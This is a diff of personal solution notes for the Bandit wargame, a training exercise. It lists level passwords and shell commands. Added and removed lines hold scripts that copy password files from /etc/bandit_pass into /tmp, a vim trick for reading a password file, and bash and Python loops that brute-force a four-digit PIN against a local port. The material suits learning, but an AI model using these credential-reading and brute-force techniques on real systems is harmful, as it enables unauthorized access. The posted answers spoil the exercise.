@@ -1,7 +1,3 @@
-########################################
-#    SOLUTIONS FOR BANDIT WARGAMES     #
-########################################
-
 level1: boJ9jbbUNNfktd78OOpsqOltutMc3MY1
 level2: CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9
 	>> ls
@@ -96,44 +92,12 @@ level 23: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 	>> cat cronjob23.sh
 	>> echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 	>> cat /tmp/8ca319486bfbbc3663ea0fbe81326349
-level 24: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+level 24:
       Shell script:
-      #!/bin/bash
-      cat /usr/bandit_pass/bandit24 >> /tmp/j-bandit/j-bandit-pass
-level 25: uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+      #!/bin/bash 
 
-      shell script (BRUTE-FORCE CRACK):
-      /* DIDN'T WORK */
-      #!/bin/bash
-      pass24=UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
-      pin=0
-      while [ $pin -lt 10000 ]; do
-      echo "Attempting PIN: $pin"
-      attempt="$(echo $pass24 $pin | nc localhost 30002)"
-      if ! [[ $attempt== *"Wrong!"* ]]; then
-      echo -ne "$attempt"
-      break
-      fi
-      ((pin++))
-      done
-      
-      /* WORKED */
-      import socket
-      pin = 0
-      bandit = 'UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ'
-      client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-      client.connect(('localhost', 30002))
-      client.recv(1024)
-      while pin in range(0, 10000):
-          message = bandit + ' ' + ' ' + str(pin) + '\n'
-	  print 'Trying: ' + message
-          client.sendall(message)
-	  data = client.recv(1024)
-	  print data
-	  pin += 1
-      
-      >> python brute.py
-level26: ** MINIMIZE window when loggin in with PEM RSA key
-	 Enter vim editor >> v
-	 >> :e/etc/bandit_pass/bandit26
-level27: 5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z
+      myname=$(whoami)
+      mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+
+      echo "PASSWORD FOR LEVEL 24"
+      cat /etc/bandit_pass/bandit24 > /tmp/
